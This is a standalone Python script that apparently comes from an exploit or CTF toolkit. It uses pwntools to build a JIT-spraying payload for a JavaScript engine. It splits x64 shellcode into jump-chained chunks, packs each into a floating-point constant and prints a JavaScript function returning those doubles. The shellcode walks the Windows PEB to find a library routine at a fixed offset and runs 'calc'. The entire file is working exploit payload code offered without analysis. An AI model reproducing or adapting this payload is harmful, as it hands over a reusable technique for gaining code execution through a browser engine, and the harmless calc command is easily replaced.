from pwn import *
import struct

context(arch='amd64')
jmp = b'\xeb\x0c'
calc = u64(b'calc\x00\x00\x00\x00')

values = []

def make_double(code):
    assert len(code) <= 6
    hex_value = hex(u64(code.ljust(6, b'\x90') + jmp))[2:]
    double_value = struct.unpack('!d', bytes.fromhex(hex_value.rjust(16, '0')))[0]
    values.append(double_value)

make_double(asm("int3;add rbx,0x60;"))
make_double(asm("mov r8,qword ptr gs:[rbx];"))   
make_double(asm("mov rdi,qword ptr [r8+0x18];")) 
make_double(asm("mov rdi,qword ptr [rdi+0x30];"))
make_double(asm("mov rdi,qword ptr [rdi];mov rdi,qword ptr [rdi];")) 
make_double(asm("mov rax,qword ptr [rdi+0x10];"))  
make_double(asm("add rax,0x686c0;"))               

make_double(asm("push %d; pop rcx;" % (calc >> 0x20)))
make_double(asm("push %d; pop rdx;" % (calc % 0x100000000)))
make_double(asm("shl rcx, 0x20;"))
make_double(asm("add rcx,rdx;xor rdx,rdx;"))
make_double(asm("push rcx;"))
make_double(asm("mov rcx,rsp;"))
code = asm("inc rdx;call rax")
assert len(code) <= 8
hex_value = hex(u64(code.ljust(8, b'\x90')))[2:]
double_value = struct.unpack('!d', bytes.fromhex(hex_value.rjust(16, '0')))[0]
values.append(double_value)

js_function = f'''
function func() {{
  return [{', '.join(map(str, values))}];
}}
'''

print(js_function)
